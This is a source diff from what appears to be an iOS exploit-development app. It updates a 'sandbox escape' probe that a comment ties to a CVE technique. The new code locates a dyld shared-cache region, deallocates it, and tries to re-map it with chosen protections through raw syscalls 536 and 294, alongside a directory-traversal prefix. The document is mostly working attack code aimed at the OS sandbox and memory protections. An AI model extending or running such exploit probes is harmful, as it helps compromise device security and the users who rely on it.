@@ -943,7 +943,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *rieConf = [UIButtonConfiguration filledButtonConfiguration];
     rieConf.baseBackgroundColor = [UIColor systemPinkColor];
     self.rieProbeButton.configuration = rieConf;
-    [self.rieProbeButton setTitle:@"Rie SBX spawn (v234)" forState:UIControlStateNormal];
+    [self.rieProbeButton setTitle:@"Rie SBX spawn (v235)" forState:UIControlStateNormal];
     [self.rieProbeButton addTarget:self action:@selector(rieProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.rieProbeButton];
 
@@ -9166,7 +9166,7 @@ static uint64_t rie_find_exec_base(task_t task,
 
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie v234: rm crashing probes, find RW pages, deallocate SR ===\n"];
+        [self appendLog:@"\n=== Rie v235: deallocate ENTIRE region + re-map probe ===\n"];
         NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
         // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
@@ -9708,65 +9708,93 @@ static uint64_t rie_find_exec_base(task_t task,
             }
         }
 
-        // ── Phase D-5: deallocate SR page → re-map → become first-mapper? ──
-        [self appendLog:@"\n── Phase D-5: SR deallocate + re-map probe ──"];
+        // ── Phase D-5: deallocate entire SR region → re-map as first-mapper? ──
+        [self appendLog:@"\n── Phase D-5: deallocate entire SR region + re-map ──"];
         {
-            // Resolve mach_vm_deallocate and mach_vm_protect
             kern_return_t (*vm_dealloc)(vm_map_t, mach_vm_address_t, mach_vm_size_t) =
                 dlsym(RTLD_DEFAULT, "mach_vm_deallocate");
-            kern_return_t (*vm_protect_fn)(vm_map_t, mach_vm_address_t, mach_vm_size_t, boolean_t, vm_prot_t) =
-                dlsym(RTLD_DEFAULT, "mach_vm_protect");
-            // Resolve vm_region for address validation
+            kern_return_t (*vm_write)(vm_map_t, mach_vm_address_t, vm_offset_t, mach_msg_type_number_t) =
+                dlsym(RTLD_DEFAULT, "mach_vm_write");
             Rie_VMRegionRecurseFn vrr5 = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
 
-            if (vm_dealloc) {
-                [self appendLog:[NSString stringWithFormat:@"  mach_vm_deallocate=%p", vm_dealloc]];
-                // Pick a test address: SR base + 0x100000 (well past the TEXT header, 1MB in)
-                // This is inside the first dyld region's writable area
-                mach_vm_address_t testAddr = 0x180100000ULL;
-                mach_vm_size_t testSize = 0x4000; // one page
-
-                // Test A: try to deallocate one page from the SR
-                errno = 0;
-                kern_return_t krA = vm_dealloc(mach_task_self(), testAddr, testSize);
-                [self appendLog:[NSString stringWithFormat:
-                    @"  A: dealloc SR page @0x%llx → kr=%d errno=%d",
-                    (unsigned long long)testAddr, krA, errno]];
-
-                // Test B: try to change protection (R→RW)
-                if (vm_protect_fn) {
-                    errno = 0;
-                    kern_return_t krB = vm_protect_fn(mach_task_self(), testAddr, testSize, FALSE,
-                        VM_PROT_READ | VM_PROT_WRITE);
-                    [self appendLog:[NSString stringWithFormat:
-                        @"  B: protect RW @0x%llx → kr=%d errno=%d",
-                        (unsigned long long)testAddr, krB, errno]];
+            if (vm_dealloc && vrr5) {
+                // Step 0: find the last dyld region (smallest, least critical)
+                rie_mach_vm_address_t lastRegionAddr = 0;
+                rie_mach_vm_size_t lastRegionSize = 0;
+                {
+                    rie_mach_vm_address_t w = 0x180000000ULL;
+                    for (int ri = 0; ri < 80; ri++) {
+                        rie_vm_region_info_t info; memset(info, 0, sizeof(info));
+                        rie_mach_vm_size_t vs = 0;
+                        natural_t d = 1;
+                        mach_msg_type_number_t cnt = sizeof(info)/sizeof(natural_t);
+                        if (vrr5(mach_task_self(), &w, &vs, &d,
+                            (rie_vm_region_recurse_info_t)info, &cnt) != KERN_SUCCESS) break;
+                        if (w >= 0x200000000ULL) break;
+                        lastRegionAddr = w;
+                        lastRegionSize = vs;
+                        w += vs;
+                    }
                 }
-
-                // If dealloc succeeded, try to re-map via syscall 536
-                if (krA == KERN_SUCCESS) {
-                    [self appendLog:@"  dealloc OK! Attempting re-map via nf=1,fd=-1..."];
-                    struct rie_sr_file tf5;
-                    struct rie_sr_mapping tm5;
-                    memset(&tf5, 0, sizeof(tf5));
-                    memset(&tm5, 0, sizeof(tm5));
-                    tf5.sf_fd = -1;
-                    tf5.sf_mappings_count = 1;
-                    tf5.sf_slide = 0;
-                    tm5.sms_address = testAddr;
-                    tm5.sms_size = testSize;
-                    tm5.sms_max_prot = 5;
-                    tm5.sms_init_prot = 3;
-                    tm5.sms_file_offset = 0;
-                    tm5.sms_slide_size = 0;
-                    tm5.sms_slide_start = 0;
-                    errno = 0;
-                    long r5 = sc(536, 1, &tf5, 1, &tm5);
+                if (lastRegionAddr && lastRegionSize > 0 && lastRegionSize <= 0x4000) {
                     [self appendLog:[NSString stringWithFormat:
-                        @"  C: re-map after dealloc → ret=%ld errno=%d", r5, errno]];
+                        @"  target last region: a=0x%llx sz=0x%llx",
+                        (unsigned long long)lastRegionAddr, (unsigned long long)lastRegionSize]];
+
+                    // Test A: deallocate ENTIRE last region
+                    errno = 0;
+                    kern_return_t krA = vm_dealloc(mach_task_self(), lastRegionAddr, lastRegionSize);
+                    [self appendLog:[NSString stringWithFormat:
+                        @"  A: dealloc ENTIRE region → kr=%d", krA]];
+
+                    // Test B: check syscall 294 state after dealloc
+                    if (krA == KERN_SUCCESS) {
+                        uint64_t newAddr = 0;
+                        errno = 0;
+                        long r294 = sc(294, &newAddr);
+                        [self appendLog:[NSString stringWithFormat:
+                            @"  B: syscall 294 after dealloc → ret=%ld addr=0x%llx errno=%d",
+                            r294, (unsigned long long)newAddr, errno]];
+
+                        // Test C: re-map deallocated region via nf=1,fd=-1
+                        struct rie_sr_file tf5;
+                        struct rie_sr_mapping tm5;
+                        memset(&tf5, 0, sizeof(tf5));
+                        memset(&tm5, 0, sizeof(tm5));
+                        tf5.sf_fd = -1;
+                        tf5.sf_mappings_count = 1;
+                        tf5.sf_slide = 0;
+
+                        // Use a vm_allocate'd page as data source
+                        uint8_t *src = NULL;
+                        vm_size_t srcSz = 0x4000;
+                        vm_allocate(mach_task_self(), (vm_address_t*)&src, srcSz, VM_FLAGS_ANYWHERE);
+                        if (src) {
+                            memset(src, 0, srcSz);
+                            tm5.sms_address = lastRegionAddr;
+                            tm5.sms_size = lastRegionSize;
+                            tm5.sms_max_prot = 5; tm5.sms_init_prot = 3;
+                            tm5.sms_file_offset = (uint64_t)(uintptr_t)src;
+                            tm5.sms_slide_size = 0; tm5.sms_slide_start = 0;
+                            errno = 0;
+                            long rC = sc(536, 1, &tf5, 1, &tm5);
+                            [self appendLog:[NSString stringWithFormat:
+                                @"  C: re-map dealloc region fd=-1 → ret=%ld errno=%d", rC, errno]];
+
+                            // Test D: also try with 0 files, 1 mapping
+                            errno = 0;
+                            long rD = sc(536, 0, NULL, 1, &tm5);
+                            [self appendLog:[NSString stringWithFormat:
+                                @"  D: re-map nf=0 nm=1 → ret=%ld errno=%d", rD, errno]];
+
+                            vm_deallocate(mach_task_self(), (vm_address_t)src, srcSz);
+                        }
+                    }
+                } else {
+                    [self appendLog:@"  no suitable small region found"];
                 }
             } else {
-                [self appendLog:@"  mach_vm_deallocate not available"];
+                [self appendLog:[NSString stringWithFormat:@"  dealloc=%p vrr=%p", vm_dealloc, vrr5]];
             }
         }
 
